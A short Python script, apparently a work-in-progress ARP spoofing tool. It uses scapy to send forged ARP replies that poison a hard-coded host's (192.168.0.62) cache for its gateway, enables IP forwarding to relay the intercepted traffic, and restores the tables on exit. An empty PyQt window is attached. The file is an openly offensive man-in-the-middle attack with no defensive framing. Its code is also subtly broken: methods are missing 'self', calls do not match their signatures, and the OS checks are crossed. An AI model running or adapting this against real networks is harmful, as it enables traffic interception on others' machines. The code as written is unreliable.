from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import sys 
from PyQt5.QtWidgets import * 

class Window(QMainWindow):
    def __init__(self):
        super().__init__() 




class SendARP(object):
    def __init__(self, target, host):
        self.target = target
        self.host = host
        self.verbose = True


    def send(self):
        self.enable_ip_route()
        try:
            while True:
                self.spoof()
                self.spoof()
                time.sleep(1)
        except KeyboardInterrupt:
            print("[!] Detected CTRL+C ! restoring the network, please wait...")
            self.restore()
            self.restore()

    def _enable_mac_iproute():
        # sysctl -w net.inet.ip.forwarding=1
        pass

    def _enable_linux_iproute():
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                return
        with open(file_path, "w") as f:
            print(1, file=f)

    def _enable_windows_iproute():
        from services import WService
        service = WService("RemoteAccess")
        service.start()

    def enable_ip_route(verbose=True):
        if verbose:
            print("[!] Enabling IP Routing...")
        if ("nt" in os.name):
            pass
            #_enable_windows_iproute() 
        elif ("posix" in os.name):
            self._enable_mac_iproute()
        else:
            self._enable_linux_iproute()

        if verbose:
            print("[!] IP Routing enabled.")

    def get_mac(self):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src


    def spoof(self):
        target_mac = self.get_mac()
        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, op='is-at')
        send(arp_response, verbose=0)
        if self.verbose:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(self.target, self.host, self_mac))


    def restore(self):
        target_mac = self.get_mac(self.target)
        host_mac = self.get_mac(self.host)
        arp_response = ARP(pdst=self.target, hwdst=target_mac, psrc=self.host, hwsrc=host_mac, op="is-at")
        send(arp_response, verbose=0, count=7)
        if self.verbose:
            print("[+] Sent to {} : {} is-at {}".format(self.target, self.host, host_mac))


if __name__ == "__main__":

    app = QApplication(sys.argv)
    win = Window()
    win.show()
    app.exec_()
    
    arp = SendARP("192.168.0.62", "192.168.0.1")
    arp.send()
    